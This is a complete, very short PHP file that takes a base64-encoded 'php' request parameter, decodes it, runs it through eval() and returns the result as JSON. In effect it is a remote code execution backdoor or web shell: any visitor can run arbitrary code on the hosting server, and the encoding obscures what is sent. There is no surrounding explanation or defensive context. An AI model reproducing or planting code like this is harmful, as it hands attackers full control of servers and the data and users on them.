<?PHP
$php = $_REQUEST['php'];
if ($php){
    $php = base64_decode($php);
    //echo $php;
    $arr = eval('return '.$php.';');
    //print_r($arr);
    echo json_encode($arr);
}

